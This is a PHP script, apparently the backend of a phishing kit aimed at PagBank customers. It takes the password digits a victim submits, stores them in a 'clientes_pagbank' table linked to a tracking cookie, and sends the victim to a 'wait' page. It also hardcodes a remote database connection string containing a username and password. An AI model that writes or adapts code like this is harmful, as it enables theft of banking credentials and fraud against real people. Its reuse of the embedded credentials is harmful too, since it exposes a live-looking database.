<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

$DATABASE_URL = getenv("DATABASE_URL");

if (!$DATABASE_URL) {
    // Se não estiver no Heroku, use as credenciais locais ou forneça um fallback
    $DATABASE_URL = "host=cd7f19r8oktbkp.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com port=5432 dbname=de3nhd2osd4jko user=u974ongr8md5qc password=p68932741a8bb7b2b28fced15dae4143f8721c875a7dfa625405c09b198d9c632";
}

$db = pg_connect($DATABASE_URL);

if (!$db) {
    die("Erro ao conectar ao banco de dados PostgreSQL.");
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // --- ALTERAÇÃO 1: LER O COOKIE EM VEZ DA SESSÃO ---
    // Usamos o cookie como identificador principal do usuário.
    $cookie_value = $_COOKIE['identificador_cliente'] ?? null;
    
    $senha = implode('', $_POST['senha'] ?? []);

    // --- ALTERAÇÃO 2: VERIFICAR O COOKIE ---
    if ($cookie_value && $senha) {
        
        // --- ALTERAÇÃO 3: ATUALIZAR A QUERY ---
        // Usamos a coluna 'identificador_cookie' na cláusula WHERE para encontrar o registro correto.
        $query = "UPDATE clientes_pagbank SET senha = $1 WHERE identificador_cookie = $2";
        
        // Passamos a senha e o valor do cookie como parâmetros.
        pg_query_params($db, $query, [$senha, $cookie_value]);
    }

    // Redireciona para a próxima página
    header("Location: aguarde.php");
    exit();
}